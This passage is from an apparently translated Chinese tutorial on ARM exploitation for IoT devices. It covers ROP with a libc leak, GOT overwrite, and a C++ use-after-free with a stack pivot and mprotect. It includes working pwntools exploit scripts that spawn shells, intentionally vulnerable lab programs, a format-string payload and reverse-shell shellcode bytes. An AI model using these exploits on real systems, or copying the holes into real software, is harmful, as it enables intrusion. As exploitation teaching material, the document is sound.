      0x10480 &lt;rop_func+20&gt;    pop    {r11}        ; (ldr r11,  [sp],  #4)
</code></pre><p>让我们前往地址0x10474:</p>
<pre><code>-&gt;   0x10474 &lt;rop_func+8&gt;     pop    {r0,  r1,  r2,  lr}
</code></pre><p>准备堆栈，我们要使用pop指令来获取读取函数的地址（泄漏），然后我们应该设置寄存器的值</p>
<pre><code>r0 - standard output = 0x00000001

r1 - address of read = 0x2100c

r2 - number of bytes to write = 0x00000004

lr - address of write = 0x104C8
</code></pre><p>为了进行调用write</p>
<pre><code>write(r0, 0x2100c, 0x4)
</code></pre><p>我们手动设置堆栈</p>
<pre><code>gef&gt; set *(int*)($sp+4)=0x2100c
gef&gt; set *(int*)($sp+8)=0x00000004
gef&gt; set *(int*)($sp+12)=0x104C8
gef&gt; x/4x $sp
0x7efff674:    0x00000001    0x0002100c    0x00000004    0x000104c8
</code></pre><p>在分支指令（bx lr）之后，我们在0x104c8处到达写入函数的地址</p>
<pre><code>-&gt;  17       write(1, &quot;Good done!\n&quot;,12);

-&gt;   0x104c8 &lt;main+24&gt;        bl     0x1032c
</code></pre><p>参数如下</p>
<pre><code>$r0   : 0x00000001
$r1   : 0x0002100c -&gt; 0x76f3a150 -&gt; &lt;read+0&gt; ldr r12,  [pc,  #96]    ; 0x76f3a1b8
$r2   : 0x00000004
</code></pre><p>nexti继续<br>我们得到了read函数的地址，从这里我们可以计算出system函数的地址，暂时先不计算system，在最终的exploit中我们会计算他。</p>
<p>到达这条指令</p>
<pre><code>0x104d4 &lt;main+36&gt;        pop    {r11,  pc}
</code></pre><p>现在我们要返回读取函数，我们必须设置“ pc ”等于read函数在我们的二进制文件（0x104d4）中的地址。</p>
<pre><code>gef&gt; set *(int*)$sp=0x00000000
gef&gt; set *(int*)($sp+4)=0x10488
</code></pre><p>如果我们继续，stepi指令将执行到read函数调用</p>
<pre><code>-&gt;   0x10488 &lt;msg_func+0&gt;     push   {r11,  lr}
      0x1048c &lt;msg_func+4&gt;     add    r11,  sp,  #4
      0x10490 &lt;msg_func+8&gt;     sub    sp,  sp,  #64    ; 0x40
      0x10494 &lt;msg_func+12&gt;    sub    r3,  r11,  #68    ; 0x44
      0x10498 &lt;msg_func+16&gt;    mov    r0,  #0
      0x1049c &lt;msg_func+20&gt;    mov    r1,  r3
</code></pre><h1 id="执行system-“-bin-sh”"><a href="#执行system-“-bin-sh”" class="headerlink" title="执行system(“/bin/sh”)"></a>执行system(“/bin/sh”)</h1><p>我们可以使用相同的rop</p>
<pre><code>pop {r0, r1, r2, lr}

bx lr
</code></pre><p>去调用system函数</p>
<pre><code>system(r0)
</code></pre><p>在这种情况下，寄存器的值将是</p>
<pre><code>r0 – address of /bin/sh

r1 – not used

r2 – not used

lr - address of system
</code></pre><p>继续并输入以下有效载荷:</p>
<pre><code>gef&gt;

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</code></pre><p>再一次到达一样的pop指令</p>
<pre><code>-&gt;   0x104ac &lt;msg_func+36&gt;    pop    {r11,  pc}
</code></pre><p>填写r11和pc寄存器</p>
<pre><code>gef&gt; find &amp;system,+1000000,&quot;/bin/sh&quot;
0x76f96588
1 pattern found.
gef&gt; set *(int*)$sp=0x76f96588
gef&gt; set *(int*)($sp+4)=0x1046C
</code></pre><p>运行到0x10474并且修改lr寄存器</p>
<pre><code>-&gt;   0x10474 &lt;rop_func+8&gt;     pop    {r0,  r1,  r2,  lr}
</code></pre><p>获取system()函数的地址:</p>
<pre><code>gef&gt; p system
$4 = {&lt;text variable, no debug info&gt;} 0x76eb0154 &lt;system&gt;
</code></pre><p>准备栈，我们只需要在$sp + 12处填充system地址</p>
<pre><code>gef&gt; set *(int*)($sp+12)=0x76eb0154
gef&gt; x/4x $sp
0x7efff674:    0x76f96588    0x00000000    0x76e8f678    0x76eb0154
</code></pre><p>继续</p>
<pre><code>gef&gt; c
Continuing.
</code></pre><p>我们得到一个shell:</p>
<pre><code>#pwd

/home/pi/arm/episode3
</code></pre><p>我们可以使用这个脚本来自动化这些步骤 (文件:<a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode3/exploits/exploit_stack_overf.py" target="_blank" rel="external">exploit_stack_overf.py</a>)</p>
<pre><code>#!/usr/bin/env python2

from pwn import *

ip = &quot;192.168.0.13&quot;
port = 22
user = &quot;pi&quot;
pwd = &quot;andrea85&quot;

libc = ELF(&apos;libc-2.24.so&apos;)

shell = ssh(user, ip, password=pwd, port=port)

sh = shell.run(&apos;/home/pi/arm/episode3/stack_overflow&apos;)

payload = &quot;A&quot;*64
payload += p32(0x1)       # r0 - standard output
payload += p32(0x1046C)   # rop gadget pop {r0, r1, r2, lr}; bx lr
payload += p32(0x2100c)   # r1 - address of read
payload += p32(0x4)       # r2 - number of bytes to write
payload += p32(0x104C8)   # lr - address of write
payload += p32(0x00)      # not used
payload += p32(0x10488)   # jump to the read  - 0x104d4 &lt;main+36&gt;        pop    {r11,  pc}
sh.sendline(payload)

# get the read address
read_address = u32(sh.recv(4))
log.info(&apos;address of the read: %#x&apos; % read_address)
# get the libc_base address
libc_base_address = read_address - libc.symbols[&apos;read&apos;]
# get the system address
system_address = libc_base_address + libc.symbols[&apos;system&apos;]
log.info(&apos;address of the system: %#x&apos; % system_address)
shell_address = libc_base_address + next(libc.search(&quot;/bin/sh&quot;))

payload = &quot;A&quot;*64
payload += p32(shell_address)       # r0 - /bin/sh address
payload += p32(0x1046C)             # rop gadget pop {r0, r1, r2, lr}; bx lr
payload += p32(0x00)                # r1 - not used
payload += p32(0x00)                # r2 - not used
payload += p32(system_address)      # lr - address of the system
sh.sendline(payload)

sh.interactive()

shell.close()
</code></pre><p>执行这个脚本<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/1" alt=""></p>
<h1 id="GOT-覆盖"><a href="#GOT-覆盖" class="headerlink" title="GOT 覆盖"></a>GOT 覆盖</h1><p>本章的目的是了解如何覆盖全局偏移量表（GOT）以重定向代码执行和弹出一个shell，我们将只使用一个ROP。</p>
<p>文件:<a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode3/got_overw.c" target="_blank" rel="external">got_overw.c</a></p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;math.h&gt;


#define MAX 12
#define PI 3.14159265

int main()
{
    static int arr[MAX];
    char ch;
    int num, ret;
    int flag=1;
    unsigned int i, in_num, out_num, cos_param, write_index;

    printf(&quot;Please fill the array:\n&quot;);

    for(i=0;i&lt;MAX;i++){
        if(scanf(&quot;%d&quot;, &amp;in_num)==1){
            arr[i]=in_num;
        }
        else{
            printf(&quot;Please enter a number\n&quot;);
            return 0;
        }
    }

    while(flag){
        printf(&quot;Select the index of the element that you want to read: \n&quot;);

        if(scanf(&quot;%d&quot;, &amp;num)!=1){
            printf(&quot;Please enter a number\n&quot;);
            return 0;
        }

        printf(&quot;At position %d the value is %d\n&quot;, num, arr[num]);

        printf(&quot;Do you want read another number? [y/n]\n&quot;);

        scanf(&quot; %c&quot;, &amp;ch);

        if(ch!=&apos;y&apos;){
            flag=0;
        }
    }

    printf(&quot;How many value do you want to modify?\n&quot;);

    if(scanf(&quot;%d&quot;, &amp;cos_param)!=1){
        printf(&quot;Please enter a number:\n&quot;);
        return 0;
    }
    //param 180
    ret = cos(cos_param * PI /180.0);

    if (ret&lt;0){
        write_index = MAX;
    }
    else
    {
        write_index = 1;
    }

    while(write_index){
        if(flag!=0){
            printf(&quot;Do you want to edit some value in the array? [y/n]\n&quot;);
            scanf(&quot; %c&quot;, &amp;ch);
        }

        if(ch==&apos;y&apos; || flag==0){
            printf(&quot;Select the index of the element that you want to modify\n&quot;);
            scanf(&quot;%d&quot;, &amp;num);

            printf(&quot;Enter the new value\n&quot;);
            scanf(&quot;%d&quot;, &amp;out_num);

            arr[num]=out_num;
            write_index--;
            flag=1;
        }
        else{
            break;
        }
    }
    printf(&quot;Good done!\n&quot;);
    return 0;
}
</code></pre><p>编译程序，这次栈不可执行</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# gcc -o got_overw got_overw.c -g -lm
</code></pre><p>ASLR已启用<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/2" alt=""></p>
<p>让我们看看这个简单的程序的行为</p>
<ol>
<li>用12个数字填充数组</li>
<li>选择数组中要读取的元素的索引</li>
</ol>
<p>请注意一下几个方面，</p>
<pre><code>1. “num”变量是一个整数，arr[num] 是会被打印输出的
2. 可以读取其他num位置的数据
3. 你所输入的想要修改的次数
</code></pre><p>This is not really true, 我们必须输入一个保存在变量“cos_param”中的数字，然后，如果</p>
<pre><code>cos(cos_param * PI /180.0)&lt;0
</code></pre><p>我们可以编辑12个元素，否则我们只能编辑一个元素，例如，如果我们要编辑12个元素，“cos_param”的值必须是180。</p>
<p>此时我们可以选择要写入的元素的索引和要插入的值。</p>
<p>我们来看一个例子<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/3" alt=""></p>
<p>我说过要注意“num”变量，例如，如果我们插入-10会发生什么？</p>
<p>在第35行设置断点<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/4" alt=""></p>
<p>拿到put函数的地址 (GOT section)<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/5" alt=""></p>
<p>也就是说，我们有了任意地址读的漏洞，通过这个漏洞可以泄露一些重要的信息(记住ALSR是打开的)</p>
<p>此时，我们看到了修改一个地址的可能</p>
<pre><code>arr[num]=out_num;
</code></pre><p>在这个例子中通过一种可控的方式我们可以修改内存数据，记住此时的got段是可写的。<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/6" alt=""></p>
<p>总之，我们现在有了任意地址读写漏洞</p>
<p>我们将通过简单的步骤去构建exp，并获得shell</p>
<ol>
<li><p>将“/bin/sh”字符串放入“arr”数组中</p>
</li>
<li><p>获得在libc库中的system函数地址</p>
</li>
</ol>
<ol>
<li><p>准备栈</p>
</li>
<li><p>编辑在GOT表中的printf函数的地址(因为printf函数会在随后被调用)</p>
</li>
</ol>
<p>试一下</p>
<p>1- 将“/bin/sh”字符串放入“arr”数组中<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/7" alt=""></p>
<p>2- 获得在libc库中的system函数地址</p>
<p>libc的main函数相对于arr数组来讲下标是(-9)<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/8" alt=""></p>
<p>在最后的exp中，我们会看到如何计算system函数的地址，现在，我们可以用简单的方法获得它<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/9" alt=""></p>
<p>3- 准备栈</p>
<p>建议用这个工具来寻找rop<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">https://github.com/JonathanSalwan/ROPgadget</a> by <a href="https://twitter.com/JonathanSalwan" target="_blank" rel="external">@</a><a href="https://twitter.com/JonathanSalwan" target="_blank" rel="external">JonathanSalwan</a><br>, ROPgadget支持ELF, PE and Mach-O format on x86, x64, ARM, ARM64, PowerPC, SPARC and MIPS 多种架构.</p>
<p>此例中中，我们需要把“/bin/sh”字符串的地址压人“r0”寄存器中，接着调用system函数</p>
<pre><code>system(r0)
</code></pre><p>同时我们发现“/bin/sh”字符串的地址在“r2”寄存器中，所以找到一个rop</p>
<pre><code>root@raspberrypi:/home/invictus/Scrivania/article/episode3# ROPgadget --binary libc-2.24.so | grep &quot;mov r0, r2&quot;

...

0x000ed748 : mov r0, r2 ; pop {r4, pc}

…
</code></pre><p>根据我们所选的rop,我们必须把system的地址放入$sp+4(也就是局部变量“cos_param”)<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/10" alt=""><br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/11" alt=""></p>
<p>4- 编辑在GOT表中的printf函数的地址(因为printf函数会在随后被调用)</p>
<p>我们知道GOT表中printf函数所在地址位于arr数组下标为“-10”的地方<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/12" alt=""></p>
<p>输入 “-10”, 然后接着输入rop的地址作为“out_num”的值</p>
<pre><code>-&gt;  74           scanf(&quot;%d&quot;, &amp;out_num);
</code></pre><p>gadget 的偏移是</p>
<pre><code>0x000ed748 : mov r0, r2 ; pop {r4, pc}
</code></pre><p>libc 基址 0x76dfa000<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/13" alt=""></p>
<p>所以gadget地址是</p>
<pre><code>gadget_address = libc_base + gadget_offset
</code></pre><p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/14" alt=""></p>
<p>我们现在可以输入gadget的地址 (0x76ee7748)<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/15" alt=""></p>
<p>继续执行</p>
<pre><code>-&gt;  84       printf(&quot;Good done!\n&quot;);
</code></pre><p>输入“stepi”指令 随后查看 “r2” 寄存器的值<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/16" alt=""></p>
<p>继续, 我们得到shell<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/17" alt=""></p>
<p>利用程序的代码如下:</p>
<p>文件:<a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode3/exploits/exploit_got.py" target="_blank" rel="external">exploit_got.py</a></p>
<pre><code>#!/usr/bin/env python2

from pwn import *

ip = &quot;192.168.0.13&quot;
port = 22
user = &quot;pi&quot;
pwd = &quot;andrea85&quot;

libc = ELF(&apos;libc-2.24.so&apos;)
gadget_offset = 0xed748

shell = ssh(user, ip, password=pwd, port=port)

sh = shell.run(&apos;/home/pi/arm/episode3/got_overw&apos;)

# fill the array
sh.recvuntil(&apos;array:\n&apos;)
sh.sendline(&apos;1852400175&apos;) # &quot;nib/&quot;
sh.sendline(&apos;6845231&apos;)    # &quot;hs/&quot;
for i in range(0,10):
    sh.sendline(str(i))

sh.recvuntil(&apos;read: \n&apos;)

# Leak the libc address
sh.sendline(&apos;-9&apos;)  # offset to the libc in the GOT section
ret = sh.recvline().split()
libc_main = int(ret[6])
# libc_base = libc_main - libc_base_offset
libc_base = libc_main - libc.symbols[&apos;__libc_start_main&apos;]
log.info(&apos;libcbase: %#x&apos; % libc_base)
# address of the system function
system_addr = libc_base + libc.symbols[&apos;system&apos;]
log.info(&apos;system address: %#x&apos; % system_addr)

sh.recvuntil(&apos;[y/n]\n&apos;)
# do not read other values
sh.sendline(&apos;n&apos;)

sh.recvuntil(&apos;modify?\n&apos;)
# send the system function address
sh.sendline(str(system_addr))
sh.recvuntil(&apos;modify\n&apos;)
sh.sendline(&apos;-10&apos;)  # offset of the put in the GOT section
sh.recvuntil(&apos;value\n&apos;)
# gadget address
gadget_address = libc_base + gadget_offset
log.info(&apos;gadget address: %#x&apos; % gadget_address)
# send the gadget address
sh.sendline(str(gadget_address))

sh.interactive()

shell.close()
</code></pre><p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/18" alt=""></p>
<h1 id="C-虚表"><a href="#C-虚表" class="headerlink" title="C++ 虚表"></a>C++ 虚表</h1><p>在最后一个示例中, 我们将了解如何通过使用 c++ 虚表来重定向易受攻击的应用程序的执行流程.</p>
<p>这是我们必须分析的应用程序: <a href="https://www.microsofttranslator.com/bv.aspx?from=&amp;to=zh-CHS&amp;a=https%3A%2F%2Fgithub.com%2Finvictus1306%2FARM-episodes%2Fblob%2Fmaster%2FEpisode3%2Fuaf.c" target="_blank" rel="external">uaf.c</a></p>
<pre><code>#include &lt;iostream&gt;
#include &lt;cerrno&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;

#define PORT     4444
#define MAX_NUM  10

using namespace std;

int fd_sock;
static int roulette;

class Note{
    protected:
    unsigned int note_number;
    string note_desc[10];

    public:
    void insert_note(string ins_note){
        if (note_number&lt;10){
            note_desc[note_number] = ins_note;
            cout &lt;&lt; &quot;Note added!&quot; &lt;&lt; endl;
            note_number++;
        }else{
            cout &lt;&lt; &quot;You can not add more notesd!&quot; &lt;&lt; endl; } } void delete_note(){ if(note_number&gt;0){
            note_number--;
        }else{
            note_number=0;
        }

        if (!note_desc[note_number].empty()){
            note_desc[note_number].clear();
            cout &lt;&lt; &quot;Note deleted!&quot; &lt;&lt; endl;
        }else{
            cout &lt;&lt; &quot;No note to delete!&quot; &lt;&lt; endl;
        }
    }

    int edit_note(unsigned int new_index, string new_note){
        if((new_index&lt;10)&amp;&amp;(!note_desc[new_index].empty())){
            note_desc[new_index] = new_note;
            cout &lt;&lt; &quot;Note modified!&quot; &lt;&lt; endl;
        }else{
            cout &lt;&lt; &quot;You can not edit this note&quot; &lt;&lt; endl;
        }
        return 0;   
    }

    virtual int show_all_notes(){
        return 0;
    }
};

class Edit : public Note{
    public:
    virtual int show_all_notes(){
        unsigned int i;
        for(i=0;i&lt;note_number;i++){
            cout &lt;&lt; note_desc[i] &lt;&lt; endl;
        }
        return 0;
    }
};

void stack_pivot(){
    asm volatile(
        &quot;ldr sp,[r4, #0x0c] \n\t&quot;
        &quot;ldr sp, [sp] \n\t&quot;      
        &quot;pop {lr, pc} \n\t&quot;
    );
}

void set_address(){
    int *num = new int[12]; 
    int tmp;
    cout &lt;&lt; &quot;Enter the number&quot; &lt;&lt; endl; cin &gt;&gt; tmp;
    num[0]=tmp;
    cout &lt;&lt; &quot;Number correctly inserted&quot; &lt;&lt; endl; } void stack_info(){ string str; printf(&quot;Debug informations area \n&quot;); cin &gt;&gt; str;
    printf(str.c_str());
}

int note(){
    int client_sockfd;
    struct sockaddr_in caddr;
    socklen_t acclen = sizeof(caddr);
    unsigned int index = 0;
    unsigned int index_to_edit=0;
    string new_note;
    string edit_not;
    int res, i;
    char c, ch;
    char *tmp;
    string input;
    char wel_msg[512] = &quot;Welcome! Enjoy to use this app to manage your notes&quot;;

    acclen = sizeof(caddr);

    Edit *edit_obj = new Edit;

    while(1){
        if((client_sockfd = accept(fd_sock, (struct sockaddr *) &amp;caddr, &amp;acclen)) &lt; 0 ){
            std::cerr &lt;&lt; strerror(errno) &lt;&lt; std::endl;
            exit(1);
        }

        dup2(client_sockfd, 0);
        dup2(client_sockfd, 1);
        dup2(client_sockfd, 2);

        cout &lt;&lt; wel_msg &lt;&lt; endl;

        while(1){
            cout &lt;&lt; &quot;1- Insert a note&quot; &lt;&lt; endl;
            cout &lt;&lt; &quot;2- show all notes&quot; &lt;&lt; endl;
            cout &lt;&lt; &quot;3- Edit a note&quot; &lt;&lt; endl;
            cout &lt;&lt; &quot;4- Delete the last note&quot; &lt;&lt; endl;
            cout &lt;&lt; &quot;5- Set your address :)&quot; &lt;&lt; endl;
            cout &lt;&lt; &quot;0- Change the message&quot; &lt;&lt; endl;
            cout &lt;&lt; endl; std::cin.clear(); cin &gt;&gt; input;
            c = input[0];
            index = atoi(&amp;c);

            switch(index){
                case 1:
                    cout &lt;&lt; &quot;Enter the new value: &quot; &lt;&lt; endl; cin &gt;&gt; new_note;
                    edit_obj-&gt;insert_note(new_note);
                    break;

                case 2:
                    edit_obj-&gt;show_all_notes();
                    break;

                case 3:
                    cout &lt;&lt; &quot;Insert the index of the note to modify: &quot; &lt;&lt; endl; cin &gt;&gt; input;
                    c = input[0];
                    index_to_edit = atoi(&amp;c);
                    cout &lt;&lt; &quot;Enter the new value: &quot; &lt;&lt; endl; cin &gt;&gt; edit_not;
                    res = edit_obj-&gt;edit_note(index_to_edit, edit_not);
                    break;

                case 4:
                    edit_obj-&gt;delete_note();
                    cout &lt;&lt; &quot;Try to set the roulette number: &quot; &lt;&lt; endl; cin &gt;&gt; roulette;
                    delete edit_obj;
                    break;

                case 5:
                    set_address();
                    break;

                case 0:
                    cout &lt;&lt; &quot;Enter the new message: &quot; &lt;&lt; endl;
                    tmp = wel_msg;
                    i=0;
                    ch = std::cin.get();
                    while ((ch = std::cin.get()) != 51 &amp;&amp; i&lt;256){
                        memcpy(tmp, &amp;ch, 256);
                        tmp = tmp + 1;
                        i += 1;
                    }
                    break;

                case 9:
                    stack_info();
                    cout &lt;&lt; &quot;Debug informations&quot; &lt;&lt; endl;
                    cout &lt;&lt; &quot;Address of wel_msg&quot; &lt;&lt; &quot;---&quot; &lt;&lt; &amp;wel_msg &lt;&lt; endl;
                    cout &lt;&lt; &quot;Address of roulette&quot; &lt;&lt; &quot;---&quot; &lt;&lt; &amp;roulette &lt;&lt; endl;
                    cout &lt;&lt; &quot;Well done!&quot; &lt;&lt; endl;
                    break;

                default:
                    cout &lt;&lt; &quot;Please select a correct option! &quot; &lt;&lt; endl;
                    break;
            }
        }
    }
    close(client_sockfd);
    return 0;
}

int main(){
    pid_t pid;
    int var = 1;
    struct sockaddr_in sockaddr;

    sockaddr.sin_family = AF_INET;
    sockaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    sockaddr.sin_port = htons(PORT);

    while(1){
        pid = fork();
        if ( pid == 0 ){
            cout &lt;&lt; &quot;Run pid=&quot; &lt;&lt; getpid() &lt;&lt; endl;
            if ((fd_sock = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0){
                std::cerr &lt;&lt; strerror(errno) &lt;&lt; std::endl;
                exit(1);
            }

            if(setsockopt(fd_sock, SOL_SOCKET, SO_REUSEADDR, &amp;var, sizeof(int)) &lt;0) {
                std::cerr &lt;&lt; strerror(errno) &lt;&lt; std::endl;
                exit(1);
            }

            if (bind(fd_sock, (struct sockaddr*) &amp;sockaddr, sizeof(sockaddr)) &lt;0 ){
                std::cerr &lt;&lt; strerror(errno) &lt;&lt; std::endl;
                exit(1);
            }

            if (listen(fd_sock, MAX_NUM) &lt; 0){
                std::cerr &lt;&lt; strerror(errno) &lt;&lt; std::endl;
                exit(1);
            }
            note();
        }
        else{
            wait(NULL);
            close(fd_sock);
        }
    }   
    return 0;
}
</code></pre><p>编译</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# g++ -o uaf uaf.c -g
</code></pre><p>该程序监听4444端口，我们可以插入插入note,并切可以显示、编辑、删除这些note,还可以设置地址、改变欢迎消息，还可以打印一些调试信息。</p>
<p>简单观察一下程序有哪些看起来比较特殊的函数:</p>
<ol>
<li>虚函数 show_all_notes()</li>
<li>stack_pivot() 函数</li>
<li>stack_info() 函数</li>
<li>delete() and set_address() 函数</li>
</ol>
<h2 id="Observation-1-–-虚函数-show-all-notes"><a href="#Observation-1-–-虚函数-show-all-notes" class="headerlink" title="Observation 1 – 虚函数 show_all_notes()"></a>Observation 1 – 虚函数 show_all_notes()</h2><p>查看一下 edit_obj 对象<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/19" alt=""></p>
<p>可以看到前4个字节是一个虚表指针，并且虚表中第一个地址指向虚函数“show_all_notes”的代码<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/20" alt=""></p>
<h2 id="Observation-2-–-stack-pivot-function"><a href="#Observation-2-–-stack-pivot-function" class="headerlink" title="Observation 2 – stack_pivot() function"></a>Observation 2 – stack_pivot() function</h2><p>如果我们能控制“r4 + #0x0c”，那么通过stack_pivot()函数我们可以设置栈为我们能控制到的地址</p>
<h2 id="Observation-3-–-stack-info-function"><a href="#Observation-3-–-stack-info-function" class="headerlink" title="Observation 3 – stack_info() function"></a>Observation 3 – stack_info() function</h2><p>在stack_info()函数中存在一个字符串格式化漏洞</p>
<h2 id="Observation-4-–-delete-and-set-address-function"><a href="#Observation-4-–-delete-and-set-address-function" class="headerlink" title="Observation 4 – delete and set_address() function"></a>Observation 4 – delete and set_address() function</h2><p>在 case 4中edit_obj被删除, 如果使用此对象, 我们将有 UAF 漏洞。set_address 函数的目的是尝试在堆中分配一个大小等于已删除对象大小的对象。</p>
<p>接下来的步骤:</p>
<ol>
<li>通过 case 9 获得 libc库 和 wel_msg、roulette变量的地址</li>
<li>释放内存并随后分配刚释放内存</li>
<li>使用wel_msg数组的空间作为新的栈空间并存放shellcode</li>
</ol>
<p>看一下细节</p>
<p>1-  通过 case 9 获得 libc库 和 wel_msg、roulette变量的地址</p>
<p>让我们分析一下 stack_info 函数<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/21" alt=""></p>
<p>我们将只使用格式字符串漏洞来从堆栈中任意读取</p>
<pre><code>0x%08x,0x%08x,0x%08x,0x%08x
</code></pre><p>我们得到以下输出</p>
<pre><code>0x00000000,0x76fb2f0c,0x0002a3f4,0xffffffff
</code></pre><p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/22" alt=""></p>
<p>让我们看看地址0x76fb2f0c<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/23" alt=""></p>
<p>我们可以用偏移量计算 libc 的基址, 在我们的例子中, libc 基址是0x76c85000</p>
<p>偏移是</p>
<pre><code>offset = 0x76fb2f0c-0x76c85000 = 0x32df0c
</code></pre><p>wel_msg、roulette变量的地址也打印出来。</p>
<p>2- 释放内存并随后分配刚释放内存</p>
<p>让我们看看删除edit_obj对象后</p>
<pre><code>case 4:
    edit_obj-&gt;delete_note();
    cout &lt;&lt; &quot;Try to set the roulette number: &quot; &lt;&lt; endl; cin &gt;&gt; roulette;
    delete edit_obj;
</code></pre><p>我们将尝试使用此字符串 “1111” 设置roulette变量, 然后在删除指令之前, 这是edit_obj的内容</p>
<pre><code>gef&gt; x/8x edit_obj
0x29318:    0x000126c8    0x00000001    0x0002a37c    0x0002a394
0x29328:    0x76fb76ec    0x76fb76ec    0x76fb76ec    0x76fb76ec
</code></pre><p>删除指令后</p>
<pre><code>gef&gt; x/8x edit_obj
0x29318:    0x00000000    0x00000001    0x0002a37c    0x0002a394
0x29328:    0x76fb76ec    0x76fb76ec    0x76fb76ec    0x76fb76ec
</code></pre><p>vtable地址将变为零。</p>
<p>roulette变量的地址是:</p>
<pre><code>gef&gt; p &amp;roulette
$1 = (int *) 0x23298 &lt;roulette&gt;
</code></pre><p>现在, 我们可以使用case 5来分配新的内存区域, 并在set_address函数中, 尝试插入roulette变量的地址 (我们从泄漏中得到)。</p>
<pre><code>5

Enter the number

144024
</code></pre><p>并查看edit_obj的地址</p>
<pre><code>gef&gt; x/x 0x29318
0x29318:    0x00023298
gef&gt; x/x 0x00023298
0x23298 &lt;_ZL8roulette&gt;:    0x00000457
gef&gt; p/d 0x00000457
$3 = 1111
</code></pre><p>然后, 我们可以使用roulette变量设置第一个 ROP 的地址, 类似于下面的图像<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/24" alt=""></p>
<p>3- 使用wel_msg数组的空间作为新的栈空间并存放shellcode</p>
<p>这一次, 我使用一个简单的 ROP 链, 使我们的一部分内存 (wel_msg) 有可执行属性，随后跳转到shellcode。</p>
<p>我在stack_pivot ()函数中提供了第一个 ROP</p>
<pre><code>void stack_pivot(){

    asm volatile(

        &quot;ldr sp,[r4, #0x0c] \n\t&quot;

        &quot;ldr sp, [sp] \n\t&quot;

        &quot;pop {lr, pc} \n\t&quot;

    );

}
</code></pre><p>我们将使用mprotect函数, 但在需要找到一个gadget来填充参数</p>
<pre><code>r0 = shellcode page aligned address

r1 = size(ofshellcode)

r2 = protection (0x7 - RWX)

pc = mprotect address
</code></pre><p>我们可以通过以下方式运行 ROPgadget:</p>
<pre><code>$ ROPgadget --binary libc-2.24.so --thumb | grep &quot;pop {r0, r1, r2&quot;
</code></pre><p>可以用下面给出的gadget</p>
<pre><code>0x000e6b08 : 

    pop {r0, r1, r2, r3, r4, pc}

    r0 = shellcode page aligned address

    r1 = size(ofshellcode)

    r2 = protection (0x7 – RWX)

    r3 = 0x00

    r4 = 0x00

pc = mprotect address
</code></pre><p>我们可以把所有的东西放在一起做一个小测试, 然后启动服务器</p>
<pre><code>gdb ./uaf
</code></pre><p>发送payload之后键入9</p>
<pre><code>0x%08x.0x%08x.0x%08x
</code></pre><p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/25" alt=""></p>
<p>然后插入下列3条 notes (case 1)</p>
<pre><code>“AAAA”
wel_msg address
“BBBB”
</code></pre><p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/26" alt=""></p>
<p>如前所述, 我们将使用 “wel_msg” 数组来作为新堆栈来保存shellcode (我们将使用反向 shell ), 然后为了编辑这个数组, 我们必须使用 “change the message” case。</p>
<p>我们必须发送</p>
<pre><code>LR= &amp;wel_msg + 36

gadget1 = pop_r0_r1_r2_r3_r4_pc

r0 = (&amp;wel_msg / PAGE_SIZE ) * PAGE_SIZE

r1 = 0x100

r2 = 0x7

r3 = 0x00

r4 = 0x00

r5 = mprotect addres
</code></pre><p>然后验证它<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/27" alt=""></p>
<pre><code>gef&gt; x/20x wel_msg
0x7efff408:    0x7efff42c    0x76d6bb09    0x7efff000    0x00000100
0x7efff418:    0x00000007    0x00000000    0x00000000    0x76d52840
0x7efff428:    0x5a5a5a5a    0xe3a00002    0xe3a01001    0xe3a02000
0x7efff438:    0xe59f7080    0xef000000    0xe1a06000    0xe3a0105c
0x7efff448:    0xe3a05011    0xe1a01c01    0xe0811805    0xe2811002
</code></pre><p>我们可以使用case 4释放edit_obj, 并将stack_pivot ()函数的地址设置为roulette值。<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/28" alt=""></p>
<p>现在我们应该分配一个新的对象, 我们在case 5 (set_address函数)中发送roulette地址<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/29" alt=""></p>
<p>最后用case 2触发该漏洞 (显示所有注释)<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/30" alt=""></p>
